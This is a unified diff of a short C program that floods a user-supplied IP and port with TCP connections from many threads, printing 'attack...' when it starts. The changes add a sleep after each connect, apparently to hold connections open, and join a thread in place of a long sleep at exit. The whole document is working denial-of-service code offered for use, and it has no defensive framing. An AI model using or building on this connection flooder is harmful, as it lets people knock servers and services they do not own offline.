@@ -1,7 +1,10 @@
 #include <stdio.h>
+
 #include <arpa/inet.h>
 #include <unistd.h>
+
 #include <pthread.h>
+
 char ip[20];
 int threads;
 int port;
@@ -19,6 +22,7 @@ while(1){
 	if(inet_pton(AF_INET,ip,&serv_addr.sin_addr)<=0)
 		break;
 	connect(sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
+	sleep(100);
 	}
 }
 int main()
@@ -29,9 +33,10 @@ scanf("%d",&port);
 printf("threads:");
 scanf("%d",&threads);
 puts("attack...");
+size_t i;
 pthread_t t[threads];
-   for(size_t i=0;i<threads;i++)
+   for(i=0;i<threads;i++)
 	pthread_create(&t[i],NULL,(void *)attack,NULL);
-sleep(10000);
+pthread_join(t[i-1],NULL);
 return 0;
 }
